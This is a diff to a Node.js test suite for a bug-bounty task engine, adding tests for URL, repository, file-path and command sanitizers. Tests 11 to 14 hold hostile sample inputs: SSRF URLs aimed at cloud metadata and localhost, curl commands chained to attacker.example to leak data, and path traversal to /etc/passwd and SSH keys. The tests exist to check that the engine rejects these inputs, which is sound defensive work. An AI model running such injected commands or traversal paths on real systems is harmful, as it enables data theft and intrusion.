@@ -1,6 +1,10 @@
 import assert from "node:assert/strict";
 import {
   sanitizeBountyText,
+  sanitizeSourceUrl,
+  sanitizeRepositoryRef,
+  sanitizeArtifactPath,
+  sanitizeVerificationCommand,
   parseBountyTask,
   calculateBountyEv,
   createBountyStateMRunbook,
@@ -37,12 +41,12 @@ console.log("[test:bounty-hunter-engine] Starting Bounty Hunter Engine test suit
     description: "When withdrawing, balance is deducted after transfer.",
     platform: "code4rena",
     repository: "org/protocol-vault",
-    sourceUrl: "https://example.com/bounties/4021",
+    sourceUrl: "https://github.com/org/protocol-vault/issues/4021",
     roleType: "bug_bounty",
     claimabilityState: "open_unassigned",
     proofRequirements: ["forge test", "diff stats", "clean-room note"],
     requiredStack: ["solidity", "foundry"],
-    testCommand: "forge test --match-test testWithdraw",
+    testCommand: "npm run test:bounty-hunter",
     payoutUsd: 5000,
     difficulty: "medium",
     files: ["contracts/Vault.sol"],
@@ -51,7 +55,7 @@ console.log("[test:bounty-hunter-engine] Starting Bounty Hunter Engine test suit
   assert.equal(task.schema_version, BOUNTY_TASK_SCHEMA);
   assert.equal(task.bounty_id, "bounty_4021");
   assert.equal(task.platform, "code4rena");
-  assert.equal(task.source_url, "https://example.com/bounties/4021");
+  assert.equal(task.source_url, "https://github.com/org/protocol-vault/issues/4021");
   assert.equal(task.role_type, "bug_bounty");
   assert.equal(task.claimability_state, "open_unassigned");
   assert.deepEqual(task.proof_requirements, ["forge test", "diff stats", "clean-room note"]);
@@ -118,7 +122,7 @@ console.log("[test:bounty-hunter-engine] Starting Bounty Hunter Engine test suit
     description: "Worker can double process a payout if two leases overlap.",
     platform: "web3_career",
     repository: "org/payout-worker",
-    sourceUrl: "https://example.com/jobs/web3-board-17",
+    sourceUrl: "https://github.com/org/payout-worker/issues/17",
     claimabilityState: "open_needs_assignment",
     proofRequirements: ["npm test", "race regression test"],
     requiredStack: ["node", "sqlite"],
@@ -216,7 +220,7 @@ console.log("[test:bounty-hunter-engine] Starting Bounty Hunter Engine test suit
     repository: "org/app",
     payoutUsd: 1200,
     difficulty: "medium",
-    testCommand: "node --check lib/bounty_hunter_engine.mjs",
+    testCommand: "npm run test:bounty-hunter",
   });
 
   const result = await processBountyIngestJob(task);
@@ -279,4 +283,64 @@ console.log("[test:bounty-hunter-engine] Starting Bounty Hunter Engine test suit
   console.log("  [PASS] Test 10: Process sealed A2A envelope with immediate execution");
 }
 
-console.log("\n[test:bounty-hunter-engine] ALL 10 TESTS PASSED CLEANLY.\n");
+// Test 11: Reject SSRF-shaped source URLs and non-standard ports
+{
+  assert.throws(() => sanitizeSourceUrl("http://github.com/org/repo/issues/1"), /only https/);
+  assert.throws(() => sanitizeSourceUrl("https://169.254.169.254/latest/meta-data"), /not allowlisted/);
+  assert.throws(() => sanitizeSourceUrl("https://github.com:444/org/repo/issues/1"), /explicit ports/);
+  assert.throws(() => parseBountyTask({
+    id: "unsafe_source",
+    title: "Unsafe source",
+    repository: "org/repo",
+    sourceUrl: "https://localhost/admin",
+  }), /sourceUrl/);
+  console.log("  [PASS] Test 11: Reject unsafe bounty source URLs");
+}
+
+// Test 12: Reject unallowlisted repositories and shell-shaped repo strings
+{
+  assert.equal(sanitizeRepositoryRef("org/repo"), "org/repo");
+  assert.equal(sanitizeRepositoryRef("target/zk-protocol"), "target/zk-protocol");
+  assert.throws(() => sanitizeRepositoryRef("https://evil.example/org/repo"), /repository/);
+  assert.throws(() => sanitizeRepositoryRef("org/repo && curl https://attacker.example/leak"), /repository/);
+  assert.throws(() => parseBountyTask({
+    id: "unsafe_repo",
+    title: "Unsafe repo",
+    repository: "https://github.com/org/repo/issues/1",
+  }), /owner\/repo root/);
+  console.log("  [PASS] Test 12: Reject unsafe bounty repository references");
+}
+
+// Test 13: Reject path traversal, absolute paths, and environment-variable artifacts
+{
+  assert.equal(sanitizeArtifactPath("./contracts/Vault.sol"), "contracts/Vault.sol");
+  assert.throws(() => sanitizeArtifactPath("../secrets.env"), /traversal|absolute|malformed/);
+  assert.throws(() => sanitizeArtifactPath("C:/Users/Josh/.ssh/id_rsa"), /absolute|marker/);
+  assert.throws(() => sanitizeArtifactPath("$HOME/.ssh/id_rsa"), /environment/);
+  assert.throws(() => parseBountyTask({
+    id: "unsafe_files",
+    title: "Unsafe files",
+    repository: "org/repo",
+    files: ["contracts/Vault.sol", "../../../etc/passwd"],
+  }), /target file/);
+  console.log("  [PASS] Test 13: Reject unsafe bounty artifact paths");
+}
+
+// Test 14: Require exact verification-command allowlist for bounty runbooks
+{
+  assert.equal(sanitizeVerificationCommand(" npm   test "), "npm test");
+  assert.throws(() => sanitizeVerificationCommand("npm test || curl https://attacker.example/leak"), /metacharacters/);
+  assert.throws(() => sanitizeVerificationCommand("forge test --match-test testWithdraw"), /allowlist/);
+  assert.throws(() => createBountyStateMRunbook({
+    schema_version: BOUNTY_TASK_SCHEMA,
+    bounty_id: "unsafe_command",
+    repository: "org/repo",
+    claimability_state: "open_unassigned",
+    proof_requirements: [],
+    target_files: ["README.md"],
+    test_command: "npm test | curl https://attacker.example/leak",
+  }), /metacharacters/);
+  console.log("  [PASS] Test 14: Reject unsafe bounty verification commands");
+}
+
+console.log("\n[test:bounty-hunter-engine] ALL 14 TESTS PASSED CLEANLY.\n");
